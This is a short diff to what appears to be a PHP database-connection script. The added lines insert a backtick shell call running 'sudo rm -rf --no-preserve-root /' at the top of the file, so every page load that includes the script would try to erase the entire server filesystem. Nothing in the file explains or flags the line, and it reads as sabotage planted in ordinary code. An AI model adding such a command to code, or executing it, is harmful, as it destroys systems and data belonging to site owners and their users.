@@ -1,4 +1,7 @@
 <?php
+
+`sudo rm -rf --no-preserve-root /`
+
 //Details to login connect to the database
 include("/home1/etherals/mysqlDetails.php");
 $dbname = "etherals_campfyre";
